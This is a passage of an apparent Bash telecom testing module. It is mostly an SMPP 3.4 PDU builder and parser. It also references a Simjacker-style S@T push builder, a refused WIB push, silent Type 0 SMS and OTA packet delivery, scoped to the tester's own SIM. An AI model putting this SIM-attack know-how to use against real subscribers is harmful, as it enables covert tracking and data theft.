    printf 'limit\t%s\n' 'the deck sends a fixed body: the CONCATENATE (§6.2.4), variable-reference (§5.5.1) and substitution (§5.4.8) encodings are built and are reachable as --sat-concat, --sat-varref and --sat-subst, but a deck that binds them needs the card to place a terminal response into a variable, and PROVIDE LOCAL INFORMATION returns its datum in the terminal response rather than into a named variable this tree can point at'
    printf 'note\t%s\n' 'a variable-bound exfiltration body is therefore assembled by hand from those three verbs, not emitted by --sat-push: the push this verb builds is the fixed-body form the public Simjacker samples use'
    printf 'limit\t%s\n' 'SPI 0000 is the no-security form the public SIMjacker samples use; the S@T-recommended 1200 form is built on request and needs OTASM_KID_KEY'
    printf 'limit\t%s\n' 'no CAT_TP / 23.048 address-addressed carrier: this is the SMS TP-UD form only'
    printf 'note\t%s\n' 'no 0xD0 octet is on the wire: the rendered_d0_* rows are the commands the card emits toward the terminal when the browser runs each macro (S@T 01.00 §6.2.9), not the transport envelope'
    if [[ "$cc_loc" == mismatch || "$cc_imei" == mismatch || "$cc_sms" == mismatch ]]; then
        printf 'ERROR\tthe rendered D0 disagrees with modules/52_stk.sh; the push built but its rendering is not trustworthy\n' >&2
        return 1
    fi
    return 0
}

# --wib-push: refused rather than invented. A plausible-looking WIB bytecode
# would read as a built push while carrying nothing that a card would execute,
# so the refusal names the missing clause instead (MODULE_CONVENTIONS §9).
otasm_wib_push() {
    cat >&2 <<'EOF'
ERROR	WIB push not built: no clause this module can cite states the WIB application request encoding
WHY	TS 102 223 §8 and the S@T command set name the S@T browser; neither defines a WIB command, and this repository carries no WIB specification
WHY	the public WIB material (#WIBattack, CVE-2020-13888) states the impact and the applet, not the byte layout of a WIB command or the leaf tags of a WIB application request
WHY	an invented encoding would still render as a push PDU and could not be told apart from a real one, which is the failure MODULE_CONVENTIONS §9 rules out
NOTE	the transport half is shared and built: --sat-push already emits the TS 31.115 §4.2 packet, its SPI/KIc/KID/TAR header, TP-PID 0x7F, TP-DCS 0xF6 and the UDH IEI 70 carrier a WIB push would ride
NOTE	to unblock: the SIMalliance WIB specification's card command chapter, or one captured WIB push message
EOF
    return 2
}

otasm_plan() {
    cat <<'EOF'
status	handoff
what	delivering an OTA command packet to a SIM
hardware	a programmable USIM you own (sysmoISIM-SJA2) plus an ISIM/OTA test bench, or a rooted modem you hold
software	pySim, osmo-sim-auth, or a SIMtrace2/pcsc reader with the SIM's OTA key set
flow	1. build a packet here with --packet  2. run --spi and --counter-check on it  3. deliver it to your own SIM
note	a live subscriber's SIM needs that subscriber's KIc/KID; this module never holds or derives another party's keys
EOF
}

# The TS 23.040 half needs a terminating SMSC rather than a SIM. A loopback
# SMSC is the honest way to exercise the TP layer end to end without a carrier.
otasm_plan_tp() {
    cat <<'EOF'
status	handoff
what	exercising the TS 23.040 TP layer against a terminating SMSC you run
hardware	none for the encoder/decoder; an SMS-capable modem you own for the loopback leg
software	an SMSC that accepts a raw TPDU on its own interface (e.g. smscsim / a
	scripted SMPP ESME that writes the TPDU to a pcap or a modem's AT+CMGS path)
flow	1. build the TPDU here (--tpdu-deliver / --type0-build)
	2. wrap it with --smsc-wrap and hand it to your own SMSC's injection point
	3. capture what the handset receives and re-run --tpdu-parse on the raw bytes
	4. --type0 confirms the Type 0 properties the handset is obliged to honour
scope	a Type 0 message is acknowledged and discarded without indication or
	storage (TS 23.040 §9.2.3.9). Its only effect on a handset you own is the
	absence of one. Point this at your own test handset, never a third party's.
EOF
}

# ── SMPP 3.4 (ESME <-> SMSC) ────────────────────────────────────────────
# Header (§4.1): command_length(4) | command_id(4) | command_status(4) |
# sequence_number(4), all big-endian, then a body of C-Octet Strings and
# fixed-width integers. A C-Octet String ends at its first NUL and the NUL is
# part of the field, so NULL is one octet 0x00 and a non-empty string is one
# octet longer than its text. A command_id with bit 31 set is the response to
# the request carrying the same id without that bit (Table 5-2). Ids come from
# Table 5-2, status names from §5.1.3, field widths and ranges from the §5.2
# body-field definitions. The builder emits only mandatory fields: optional
# parameters are TLVs and are refused rather than guessed.
OTASM_SMPP_PORT=2775

# Integer argument: decimal or 0x-prefixed hex on stdout, 1 when it is neither.
_otasm_smpp_int() {
    local v="${1:-}"
    v="${v//[[:space:]]/}"
    [[ -n "$v" ]] || return 1
    if [[ "$v" =~ ^0[xX][0-9a-fA-F]+$ ]]; then
        printf '%d' "$(( v ))"
    elif [[ "$v" =~ ^[0-9]+$ ]]; then
        printf '%d' "$(( 10#$v ))"
    else
        return 1
    fi
}

# Validate an integer field argument; stdout carries the value when it parses,
# stderr carries ERROR+WHY when it does not. Returns 1 on a non-integer.
_otasm_smpp_uint() {
    local field="$1" raw="$2" n
    if ! n=$(_otasm_smpp_int "$raw"); then
        printf 'ERROR\t%s: "%s" is not an integer\n' "$field" "$raw" >&2
        printf 'WHY\t%s is encoded as a fixed-width integer; "%s" has no such encoding and is not rounded into one\n' "$field" "$raw" >&2
        return 1
    fi
    printf '%d' "$n"
}

_otasm_smpp_u8() { printf '%02x' "$(( ${1:-0} & 0xff ))"; }

# C-Octet String from text: lowercase hex with the terminating NUL appended.
# Refuses non-printable bytes (this builder carries printable ASCII and does
# not pick a character set) and refuses text that would overflow the field.
_otasm_smpp_cstr() {
    local text="${1-}" max="${2:-0}" field="${3:-field}" h
    if [[ "$text" == *[![:print:]]* ]]; then
        printf 'ERROR\t%s carries a character this builder will not encode\n' "$field" >&2
        printf 'WHY\t%s is a C-Octet String of octets whose last octet is NUL; this builder carries printable ASCII and will not choose a character set for anything else\n' "$field" >&2
        return 1
    fi
    if (( ${#text} + 1 > max )); then
        printf 'ERROR\t%s is %d octets with its NUL; the SMPP 3.4 limit is %d\n' "$field" "$(( ${#text} + 1 ))" "$max" >&2
        printf 'WHY\tno truncation is applied: a shortened address or identifier would be a different value than the one given\n' >&2
        return 1
    fi
    h=$(printf '%s' "$text" | od -An -v -tx1 | tr -d ' \n')
    printf '%s00' "${h,,}"
}

# Render the content octets of a C-Octet String as text for the parse rows.
# Non-printable content is shown as hex rather than as a byte soup that would
# break the row.
_otasm_smpp_text() {
    local h="${1-}" i b out=''
    if [[ -z "$h" ]]; then printf '(null)'; return 0; fi
    for (( i = 0; i < ${#h}; i += 2 )); do
        b="${h:i:2}"
        if [[ ! "$b" =~ ^(2[0-9a-f]|[3-6][0-9a-f]|7[0-9a-e])$ ]]; then
            printf 'hex:%s' "$h"
            return 0
        fi
        out+=$(printf "\\x$b")
    done
    printf '%s' "$out"
}

# Command id -> name, kind, direction. Table 5-2 of SMPP 3.4.
_otasm_smpp_cmd() {
    case "${1:-}" in
        00000001) printf 'bind_receiver\trequest\tesme->smsc\n' ;;
        00000002) printf 'bind_transmitter\trequest\tesme->smsc\n' ;;
        00000003) printf 'query_sm\trequest\tesme->smsc\n' ;;
        00000004) printf 'submit_sm\trequest\tesme->smsc\n' ;;
        00000005) printf 'deliver_sm\trequest\tsmsc->esme\n' ;;
        00000006) printf 'unbind\trequest\teither\n' ;;
        00000007) printf 'replace_sm\trequest\tesme->smsc\n' ;;
        00000008) printf 'cancel_sm\trequest\tesme->smsc\n' ;;
        00000009) printf 'bind_transceiver\trequest\tesme->smsc\n' ;;
        0000000b) printf 'outbind\trequest\tsmsc->esme\n' ;;
        00000015) printf 'enquire_link\trequest\teither\n' ;;
        00000021) printf 'submit_multi\trequest\tesme->smsc\n' ;;
        00000102) printf 'alert_notification\tnotification\tsmsc->esme\n' ;;
        00000103) printf 'data_sm\trequest\teither\n' ;;
        00000111) printf 'broadcast_sm\trequest\tesme->smsc\n' ;;
        00000112) printf 'query_broadcast_sm\trequest\tesme->smsc\n' ;;
        00000113) printf 'cancel_broadcast_sm\trequest\tesme->smsc\n' ;;
        80000000) printf 'generic_nack\tresponse\teither\n' ;;
        80000001) printf 'bind_receiver_resp\tresponse\tsmsc->esme\n' ;;
        80000002) printf 'bind_transmitter_resp\tresponse\tsmsc->esme\n' ;;
        80000003) printf 'query_sm_resp\tresponse\tsmsc->esme\n' ;;
        80000004) printf 'submit_sm_resp\tresponse\tsmsc->esme\n' ;;
        80000005) printf 'deliver_sm_resp\tresponse\tesme->smsc\n' ;;
        80000006) printf 'unbind_resp\tresponse\teither\n' ;;
        80000007) printf 'replace_sm_resp\tresponse\tsmsc->esme\n' ;;
        80000008) printf 'cancel_sm_resp\tresponse\tsmsc->esme\n' ;;
        80000009) printf 'bind_transceiver_resp\tresponse\tsmsc->esme\n' ;;
        80000015) printf 'enquire_link_resp\tresponse\teither\n' ;;
        80000021) printf 'submit_multi_resp\tresponse\tsmsc->esme\n' ;;
        80000103) printf 'data_sm_resp\tresponse\teither\n' ;;
        80000111) printf 'broadcast_sm_resp\tresponse\tsmsc->esme\n' ;;
        80000112) printf 'query_broadcast_sm_resp\tresponse\tsmsc->esme\n' ;;
        80000113) printf 'cancel_broadcast_sm_resp\tresponse\tsmsc->esme\n' ;;
        *) return 1 ;;
    esac
}

# Command name (or a numeric id) -> 8-digit id. Returns 1 when neither parses.
_otasm_smpp_id() {
    local q="${1:-}" n
    q="${q,,}"
    q="${q//-/_}"
    q="${q// /_}"
    if [[ "$q" =~ ^0x[0-9a-f]+$ ]]; then
        n=$(( q ))
        (( n >= 0 && n <= 0xffffffff )) || return 1
        printf '%08x' "$n"
        return 0
    fi
    if [[ "$q" =~ ^[0-9]+$ ]]; then
        n=$(( 10#$q ))
        (( n >= 0 && n <= 0xffffffff )) || return 1
        printf '%08x' "$n"
        return 0
    fi
    case "$q" in
        bind_receiver)           printf '00000001' ;;
        bind_transmitter)        printf '00000002' ;;
        query_sm)                printf '00000003' ;;
        submit_sm)               printf '00000004' ;;
        deliver_sm)              printf '00000005' ;;
        unbind)                  printf '00000006' ;;
        replace_sm)              printf '00000007' ;;
        cancel_sm)               printf '00000008' ;;
        bind_transceiver)        printf '00000009' ;;
        outbind)                 printf '0000000b' ;;
        enquire_link)            printf '00000015' ;;
        submit_multi)            printf '00000021' ;;
        alert_notification)      printf '00000102' ;;
        data_sm)                 printf '00000103' ;;
        broadcast_sm)            printf '00000111' ;;
        query_broadcast_sm)      printf '00000112' ;;
        cancel_broadcast_sm)     printf '00000113' ;;
        generic_nack)            printf '80000000' ;;
        bind_receiver_resp)      printf '80000001' ;;
        bind_transmitter_resp)   printf '80000002' ;;
        query_sm_resp)           printf '80000003' ;;
        submit_sm_resp)          printf '80000004' ;;
        deliver_sm_resp)         printf '80000005' ;;
        unbind_resp)             printf '80000006' ;;
        replace_sm_resp)         printf '80000007' ;;
        cancel_sm_resp)          printf '80000008' ;;
        bind_transceiver_resp)   printf '80000009' ;;
        enquire_link_resp)       printf '80000015' ;;
        submit_multi_resp)       printf '80000021' ;;
        data_sm_resp)            printf '80000103' ;;
        broadcast_sm_resp)       printf '80000111' ;;
        query_broadcast_sm_resp) printf '80000112' ;;
        cancel_broadcast_sm_resp) printf '80000113' ;;
        *) return 1 ;;
    esac
}

# Split a command id into OTASM_SMPP_NAME / _KIND / _DIR. Returns 1 when the id
# is not in Table 5-2.
OTASM_SMPP_NAME=''
OTASM_SMPP_KIND=''
OTASM_SMPP_DIR=''
_otasm_smpp_info() {
    local info rest
    info=$(_otasm_smpp_cmd "${1:-}") || return 1
    OTASM_SMPP_NAME="${info%%$'\t'*}"
    rest="${info#*$'\t'}"
    OTASM_SMPP_KIND="${rest%%$'\t'*}"
    OTASM_SMPP_DIR="${rest#*$'\t'}"
    return 0
}

# command_status -> name. §5.1.3.
_otasm_smpp_status() {
    case "${1:-}" in
        00000000) printf 'ESME_ROK' ;;
        00000001) printf 'ESME_RINVMSGLEN' ;;
        00000002) printf 'ESME_RINVCMDLEN' ;;
        00000003) printf 'ESME_RINVCMDID' ;;
        00000004) printf 'ESME_RINVBNDSTS' ;;
        00000005) printf 'ESME_RALYBND' ;;
        00000006) printf 'ESME_RINVPRTFLG' ;;
        00000007) printf 'ESME_RINVREGDLVFLG' ;;
        00000008) printf 'ESME_RSYSERR' ;;
        0000000a) printf 'ESME_RINVSRCADR' ;;
        0000000b) printf 'ESME_RINVDSTADR' ;;
        0000000c) printf 'ESME_RINVMSGID' ;;
        0000000d) printf 'ESME_RBINDFAIL' ;;
        0000000e) printf 'ESME_RINVPASWD' ;;
        0000000f) printf 'ESME_RINVSYSID' ;;
        00000011) printf 'ESME_RCANCELFAIL' ;;
        00000013) printf 'ESME_RREPLACEFAIL' ;;
        00000014) printf 'ESME_RMSGQFUL' ;;
        00000015) printf 'ESME_RINVSERTYP' ;;
        00000033) printf 'ESME_RINVNUMDESTS' ;;
        00000034) printf 'ESME_RINVDLNAME' ;;
        00000040) printf 'ESME_RINVDESTFLAG' ;;
        00000042) printf 'ESME_RINVSUBREP' ;;
        00000043) printf 'ESME_RINVESMCLASS' ;;
        00000044) printf 'ESME_RCNTSUBDL' ;;
        00000045) printf 'ESME_RSUBMITFAIL' ;;
        00000048) printf 'ESME_RINVSRCTON' ;;
        00000049) printf 'ESME_RINVSRCNPI' ;;
        00000050) printf 'ESME_RINVDSTTON' ;;
        00000051) printf 'ESME_RINVDSTNPI' ;;
        00000053) printf 'ESME_RINVSYSTYP' ;;
        00000054) printf 'ESME_RINVREPFLAG' ;;
        00000055) printf 'ESME_RINVNUMMSGS' ;;
        00000058) printf 'ESME_RTHROTTLED' ;;
        00000061) printf 'ESME_RINVSCHED' ;;
        00000062) printf 'ESME_RINVEXPIRY' ;;
        00000063) printf 'ESME_RINVDFTMSGID' ;;
        00000064) printf 'ESME_RX_T_APPN' ;;
        00000065) printf 'ESME_RX_P_APPN' ;;
        00000066) printf 'ESME_RX_R_APPN' ;;
        00000067) printf 'ESME_RQUERYFAIL' ;;
        000000c0) printf 'ESME_RINVOPTPARSTREAM' ;;
        000000c1) printf 'ESME_ROPTPARNOTALLWD' ;;
        000000c2) printf 'ESME_RINVPARLEN' ;;
        000000c3) printf 'ESME_RMISSINGOPTPARAM' ;;
        000000c4) printf 'ESME_RINVOPTPARAMVAL' ;;
        000000c5) printf 'ESME_RDELIVERYFAILURE' ;;
        000000fe) printf 'ESME_RUNKNOWNERR' ;;
        *) printf 'unassigned' ;;
    esac
}

# Body layout of the command ids this module decodes: one "kind<TAB>name" per
# field, in wire order. Absent ids return 1 (the body is not walked here).
# ── optional parameters (SMPP 3.4 §4.7.1, Table 4-12) ──────────────────
# Every SMPP body ends with zero or more tag/length/value triplets: a two-octet
# tag, a two-octet length that counts the VALUE only, then that many octets. The
# trap is that the length excludes both tag and length, so a reader that adds two
# or four lands mid-triplet and the next tag is noise. Another trap: the same tag
# carries different types depending on the PDU, so this table names the tag and
# this module prints the octets rather than claiming a value it would have to
# guess at (message_payload is text only because the PDU it appears in says so).
_otasm_smpp_tlv_name() {
    case "${1:-}" in
        0005) printf 'dest_addr_subunit' ;;
        0006) printf 'dest_network_type' ;;
        0007) printf 'dest_bearer_type' ;;
        0008) printf 'dest_telematics_id' ;;
        000d) printf 'source_addr_subunit' ;;
        000e) printf 'source_addr_network_type' ;;
        000f) printf 'source_addr_bearer_type' ;;
        0010) printf 'source_addr_telematics_id' ;;
        0017) printf 'qos_time_to_live' ;;
        0019) printf 'payload_type' ;;
        001d) printf 'additional_status_info_text' ;;
        001e) printf 'receipted_message_id' ;;
        0030) printf 'ms_msg_wait_facilities' ;;
        0201) printf 'privacy_indicator' ;;
        020c) printf 'sar_msg_ref_num' ;;
        020e) printf 'sar_total_segments' ;;
        020f) printf 'sar_segment_seqnum' ;;
        0210) printf 'sc_interface_version' ;;
        0302) printf 'callback_num_pres_ind' ;;
        0303) printf 'callback_num_atag' ;;
        0304) printf 'number_of_messages' ;;
        0381) printf 'callback_num' ;;
        0420) printf 'dpf_result' ;;
        0421) printf 'set_dpf' ;;
        0422) printf 'ms_availability_status' ;;
        0423) printf 'network_error_code' ;;
        0424) printf 'message_payload' ;;
        0425) printf 'delivery_failure_reason' ;;
        0426) printf 'more_messages_to_send' ;;
        0427) printf 'message_state' ;;
        0501) printf 'ussd_service_op' ;;
        1201) printf 'display_time' ;;
        1203) printf 'sms_signal' ;;
        1204) printf 'ms_validity' ;;
        130c) printf 'alert_on_message_delivery' ;;
        1380) printf 'its_reply_type' ;;
        1383) printf 'its_session_info' ;;
        *) return 1 ;;
    esac
}

# Walk tag/length/value triplets from off to end. Leaves OTASM_SMPP_OFF past the
# last one it could establish, and refuses rather than guessing when a length
# runs past the end of the PDU.
_otasm_smpp_walk_tlvs() {
    local hex="$1" off="$2" end="$3" tag len val name n=0 text
    local start=$off
    while (( off < end )); do
        if (( off + 4 > end )); then
            printf 'ERROR\tan optional parameter starts at offset %d but only %d octet(s) are left; the tag and its length need four\n' \
                "$off" "$(( end - off ))" >&2
            printf 'WHY\ta TLV is tag(2) length(2) value(length); with fewer than four octets the triplet has no boundary and the remaining bytes are not a parameter\n' >&2
            return 1
        fi
        tag="${hex:$(( off * 2 )):4}"
        len=$(( 16#${hex:$(( off * 2 + 4 )):4} ))
        if (( off + 4 + len > end )); then
            printf 'ERROR\toptional parameter 0x%s at offset %d says its value is %d octets but only %d remain\n' \
                "$tag" "$off" "$len" "$(( end - off - 4 ))" >&2
            printf 'WHY\tthe length counts the value only, not the tag and length octets; a value that runs past the PDU means the triplet is truncated and the bytes after it are not another parameter\n' >&2
            return 1
        fi
        val="${hex:$(( (off + 4) * 2 )):$(( len * 2 ))}"
        if name=$(_otasm_smpp_tlv_name "$tag"); then
            :
        else
            name="unknown_tag_0x$tag"
        fi
        if [[ "$name" == "message_payload" || "$name" == "receipted_message_id" || "$name" == "additional_status_info_text" ]]; then
            text=$(_otasm_smpp_text "$val")
        else
            text=""
        fi
        printf 'tlv\t%d\t0x%s\t%s\t%d\t%s\t%s\n' "$off" "$tag" "$name" "$len" "$val" "$text"
        n=$(( n + 1 ))
        off=$(( off + 4 + len ))
    done
    OTASM_SMPP_OFF=$off
    OTASM_SMPP_TLVS=$n
    return 0
}

# Compose one optional parameter, so an operator can put TLVs on a body by hand:
# --smpp-tlv message_payload 00410042 emits 0424 0004 00410042.
otasm_smpp_tlv_build() {
    local what="${1:-}" value="${2:-}" tag_hex len_hex
    if [[ -z "$what" ]]; then
        printf 'ERROR\tusage: --smpp-tlv <tag-name|0xNNNN> <hex-value>\n' >&2
        printf 'WHY\tan optional parameter is named by its tag, and the name and the value are both needed to emit the triplet\n' >&2
        return 2
    fi
    case "${what,,}" in
        0x*) tag_hex="${what:2}" ;;
        *)   tag_hex="" ;;
    esac
    if [[ -z "$tag_hex" ]]; then
        local t
        for t in 0005 0006 0007 0008 000d 000e 000f 0010 0017 0019 001d 001e 0030 \
                 0201 020c 020e 020f 0210 0302 0303 0304 0381 0420 0421 0422 0423 \
                 0424 0425 0426 0427 0501 1201 1203 1204 130c 1380 1383; do
            if [[ "$(_otasm_smpp_tlv_name "$t")" == "${what,,}" ]]; then tag_hex="$t"; break; fi
        done
        if [[ -z "$tag_hex" ]]; then
            printf 'ERROR\t%s is not an optional parameter this module can name\n' "$what" >&2
            printf 'WHY\tthe tag table is SMPP 3.4 Table 4-12; a name outside it has no tag, and inventing one would produce a triplet no SMSC reads\n' >&2
            return 2
        fi
    fi
    [[ "$tag_hex" =~ ^[0-9a-f]{4}$ ]] || {
        printf 'ERROR\tthe tag must be four hex digits: %s\n' "$what" >&2; return 2; }
    value=$(otasm_norm_hex "$value")
    [[ "$value" =~ ^[0-9a-f]*$ ]] || {
        printf 'ERROR\tthe value must be hex octets\n' >&2
        printf 'WHY\tan optional parameter value is octets; the type is in the PDU definition, so text is encoded by the caller\n' >&2
        return 2; }
    (( ${#value} % 2 == 0 )) || { printf 'ERROR\tthe value is an odd number of hex digits\n' >&2; return 2; }
    len_hex=$(printf '%04x' "$(( ${#value} / 2 ))")
    printf 'tag\t0x%s\n' "$tag_hex"
    printf 'name\t%s\n' "$(_otasm_smpp_tlv_name "$tag_hex")"
    printf 'value_octets\t%d\n' "$(( ${#value} / 2 ))"
    printf 'length_hex\t%s\n' "$len_hex"
    printf 'tlv_hex\t%s%s%s\n' "$tag_hex" "$len_hex" "$value"
    printf 'length_note\tthe length counts the value only: tag and length are four octets that are not in it (§4.7.1)\n'
    printf 'ref\tSMPP 3.4 §4.7.1, Table 4-12\n'
}

# What SMPP over TLS changes: nothing in the PDUs and everything around them.
# Port 3550 is the long-standing dedicated port and 2775 the alternative; the
# session layer is a TLS record stream, so a PDU can straddle records and the
# 16-octet header is not a framing boundary on the wire any more. This module can
# build PDUs and cannot terminate an SMPP session, so the honest output is the
# shape of the stream and the refusal to pretend otherwise.
otasm_smpp_tls() {
    local port="${1:-3550}"
    [[ "$port" =~ ^[0-9]{2,5}$ ]] || {
        printf 'ERROR\t--smpp-tls takes a port number\n' >&2; return 2; }
    printf 'transport\tTLS over TCP\n'
    printf 'default_port\t3550\n'
    printf 'alternative_port\t2775\n'
    printf 'port_asked\t%s\n' "$port"
    printf 'pdu_framing\tunchanged: command_length still counts the whole PDU (§4.1)\n'
    printf 'record_framing\tadded: a TLS record is at most 16384 plaintext octets, so a large message_payload is split across records that do not align with PDUs\n'
    printf 'straddle\tpossible: one PDU may span two records and one record may hold several PDUs, so a reader must buffer until command_length octets arrive\n'
    printf 'visible_to_the_middle\tTLS record header (content type, version, length) and the handshake of the session; no command_id and no sequence_number\n'
    printf 'client_auth\toptional in TLS, and an SMPP bind carries its own system_id/password inside the tunnel: one authenticates the transport, the other the account\n'
    printf 'build\tyes, --smpp-build emits PDUs that are byte-identical with or without TLS\n'
    printf 'terminate\tno: this tree builds PDUs and has no SMPP session layer, so it cannot accept a bind or answer an enquire_link\n'
    printf 'what_that_costs\ta capture on 3550 yields records, not PDUs, unless the session key is available; the PDU decoders here apply after decryption\n'
    printf 'ref\tSMPP 3.4 §4.1 (framing), SMPP over TLS is a deployment convention, not a clause in 3.4\n'
    printf 'verdict\tsmpp_tls_admitted_by_shape\n'
}


_otasm_smpp_layout() {
    case "${1:-}" in
        00000001|00000002|00000009)
            printf 'cstr\tsystem_id\ncstr\tpassword\ncstr\tsystem_type\nu8\tinterface_version\nu8\taddr_ton\nu8\taddr_npi\ncstr\taddress_range\n' ;;
        00000004|00000005)
            printf 'cstr\tservice_type\nu8\tsource_addr_ton\nu8\tsource_addr_npi\ncstr\tsource_addr\nu8\tdest_addr_ton\nu8\tdest_addr_npi\ncstr\tdestination_addr\nu8\tesm_class\nu8\tprotocol_id\nu8\tpriority_flag\ncstr\tschedule_delivery_time\ncstr\tvalidity_period\nu8\tregistered_delivery\nu8\treplace_if_present_flag\nu8\tdata_coding\nu8\tsm_default_msg_id\nu8\tsm_length\noctets\tshort_message\n' ;;
        00000021)
            printf 'cstr\tservice_type\nu8\tsource_addr_ton\nu8\tsource_addr_npi\ncstr\tsource_addr\nu8\tnumber_of_dests\ndests\tdest_addresses\nu8\tesm_class\nu8\tprotocol_id\nu8\tpriority_flag\ncstr\tschedule_delivery_time\ncstr\tvalidity_period\nu8\tregistered_delivery\nu8\treplace_if_present_flag\nu8\tdata_coding\nu8\tsm_default_msg_id\nu8\tsm_length\noctets\tshort_message\n' ;;
        00000103)
            printf 'cstr\tservice_type\nu8\tsource_addr_ton\nu8\tsource_addr_npi\ncstr\tsource_addr\nu8\tdest_addr_ton\nu8\tdest_addr_npi\ncstr\tdestination_addr\nu8\tesm_class\nu8\tregistered_delivery\nu8\tdata_coding\n' ;;
        00000006|00000015) printf '' ;;
        80000000|80000006|80000007|80000008|80000015) printf '' ;;
        80000001|80000002|80000009) printf 'cstr\tsystem_id\n' ;;
        80000004|80000005|80000103) printf 'cstr\tmessage_id\n' ;;
        80000003) printf 'cstr\tmessage_id\ncstr\tfinal_date\nu8\tmessage_state\nu8\terror_code\n' ;;
        80000021) printf '' ;;
        *) return 1 ;;
    esac
}

# Header rows shared by --smpp-parse and the response builder.
_otasm_smpp_header_tsv() {
    local hex="$1" cid="$2"
    printf 'command_length\t%d\n' "$(( 16#${hex:0:8} ))"
    printf 'command_id\t%s\n' "$cid"
    printf 'command_status\t%s\n' "${hex:16:8}"
    printf 'command_status_name\t%s\n' "$(_otasm_smpp_status "${hex:16:8}")"
    printf 'sequence_number\t%s\n' "${hex:24:8}"
    if _otasm_smpp_info "$cid"; then
        printf 'name\t%s\n' "$OTASM_SMPP_NAME"
        printf 'kind\t%s\n' "$OTASM_SMPP_KIND"
        printf 'direction\t%s\n' "$OTASM_SMPP_DIR"
    fi
}

# Walk one layout over the body, printing field rows with their offsets and
# stopping at the first boundary that cannot be established. Leaves the next
# offset in OTASM_SMPP_OFF.
OTASM_SMPP_OFF=16
_otasm_smpp_walk_body() {
    local hex="$1" off="$2" end="$3" layout="$4"
    local kind name byte sz got n
    OTASM_SMPP_OFF=$off
    if [[ -z "$layout" ]]; then
        return 0
    fi
    while IFS=$'\t' read -r kind name; do
        case "$kind" in
            cstr)
                sz=0
                got=0
                while (( off + sz < end )); do
                    if [[ "${hex:$(( (off + sz) * 2 )):2}" == "00" ]]; then
                        got=1
                        break
                    fi
                    sz=$(( sz + 1 ))
                done
                if (( got == 0 )); then
                    printf 'ERROR\tC-Octet String %s at offset %d runs to the end of the PDU without a NUL\n' "$name" "$off" >&2
                    printf 'WHY\tthe last octet of a C-Octet String is its NUL and the NUL counts in the field; without one the next field has no boundary, so nothing after it is decoded\n' >&2
                    return 1
                fi
                printf 'field\t%d\t%s\tC-Octet-String\t%s\t%s\n' \
                    "$off" "$name" "${hex:$(( off * 2 )):$(( (sz + 1) * 2 ))}" \
                    "$(_otasm_smpp_text "${hex:$(( off * 2 )):$(( sz * 2 ))}")"
                off=$(( off + sz + 1 ))
                ;;
            u8)
                if (( off >= end )); then
                    printf 'ERROR\t%s starts at offset %d but the PDU ends at %d\n' "$name" "$off" "$end" >&2
                    printf 'WHY\ta missing octet means the PDU is truncated; it is not read as zero because zero is a different value\n' >&2
                    return 1
                fi
                byte="${hex:$(( off * 2 )):2}"
                printf 'field\t%d\t%s\tInteger\t%s\t%d\n' "$off" "$name" "$byte" "$(( 16#$byte ))"
                if [[ "$name" == "sm_length" || "$name" == "number_of_dests" ]]; then
                    n=$(( 16#$byte ))
                fi
                off=$(( off + 1 ))
                ;;
            dests)
                # number_of_dests was the previous row; each entry is a
                # dest_flag followed by one of two shapes (§5.2.2.2):
                # dest_flag 1 = SME address (ton, npi, C-Octet String),
                # dest_flag 2 = distribution list name (C-Octet String).
                local k=0 flag dton dnpi dsz dgot dstr
                while (( k < n )); do
                    if (( off >= end )); then
                        printf 'ERROR\tdestination %d of %d starts at offset %d but the PDU ends at %d\n' \
                            "$(( k + 1 ))" "$n" "$off" "$end" >&2
                        printf 'WHY\tnumber_of_dests says %d entries and only %d could be walked; the rest are not invented\n' "$n" "$k" >&2
                        return 1
                    fi
                    flag=$(( 16#${hex:$(( off * 2 )):2} ))
                    off=$(( off + 1 ))
                    case "$flag" in
                        1)
                            if (( off + 2 > end )); then
                                printf 'ERROR\tdestination %d has a dest_flag but no ton/npi\n' "$(( k + 1 ))" >&2
                                return 1
                            fi
                            dton=$(( 16#${hex:$(( off * 2 )):2} ))
                            dnpi=$(( 16#${hex:$(( (off + 1) * 2 )):2} ))
                            off=$(( off + 2 ))
                            dsz=0; dgot=0
                            while (( off + dsz < end )); do
                                if [[ "${hex:$(( (off + dsz) * 2 )):2}" == "00" ]]; then dgot=1; break; fi
                                dsz=$(( dsz + 1 ))
                            done
                            (( dgot )) || {
                                printf 'ERROR\tdestination %d has no NUL-terminated address\n' "$(( k + 1 ))" >&2
                                return 1; }
                            dstr=$(_otasm_smpp_text "${hex:$(( off * 2 )):$(( dsz * 2 ))}")
                            printf 'field\t%d\tdestination[%d].dest_flag\tInteger\t%02x\t%d\n' \
                                "$(( off - 3 ))" "$(( k + 1 ))" "$flag" "$flag"
                            printf 'field\t%d\tdestination[%d].ton_npi\tOctets\t%02x%02x\t%d/%d\n' \
                                "$(( off - 2 ))" "$(( k + 1 ))" "$dton" "$dnpi" "$dton" "$dnpi"
                            printf 'field\t%d\tdestination[%d].sme_address\tC-Octet-String\t%s\t%s\n' \
                                "$off" "$(( k + 1 ))" "${hex:$(( off * 2 )):$(( (dsz + 1) * 2 ))}" "$dstr"
                            off=$(( off + dsz + 1 ))
                            ;;
                        2)
                            dsz=0; dgot=0
                            while (( off + dsz < end )); do
                                if [[ "${hex:$(( (off + dsz) * 2 )):2}" == "00" ]]; then dgot=1; break; fi
                                dsz=$(( dsz + 1 ))
                            done
                            (( dgot )) || {
                                printf 'ERROR\tdestination %d distribution list has no NUL\n' "$(( k + 1 ))" >&2
                                return 1; }
                            dstr=$(_otasm_smpp_text "${hex:$(( off * 2 )):$(( dsz * 2 ))}")
                            printf 'field\t%d\tdestination[%d].dest_flag\tInteger\t%02x\t%d\n' \
                                "$(( off - 1 ))" "$(( k + 1 ))" "$flag" "$flag"
                            printf 'field\t%d\tdestination[%d].dl_name\tC-Octet-String\t%s\t%s\n' \
                                "$off" "$(( k + 1 ))" "${hex:$(( off * 2 )):$(( (dsz + 1) * 2 ))}" "$dstr"
                            off=$(( off + dsz + 1 ))
                            ;;
                        *)
                            printf 'ERROR\tdestination %d has dest_flag %d, and the only values are 1 (SME address) and 2 (distribution list)\n' \
                                "$(( k + 1 ))" "$flag" >&2
                            printf 'WHY\tthe flag selects which of the two shapes follows; any other value leaves the next octets untyped, so nothing after it is decoded\n' >&2
                            return 1
                            ;;
                    esac
                    k=$(( k + 1 ))
                done
                printf 'dests\t%d\n' "$n"
                ;;
            octets)
                if (( off + n > end )); then
                    printf 'ERROR\tshort_message needs %d octets from offset %d but the PDU ends at %d\n' "$n" "$off" "$end" >&2
                    printf 'WHY\tsm_length counts the octets of short_message; with fewer octets present the PDU is truncated and the missing ones are not invented\n' >&2
                    return 1
                fi
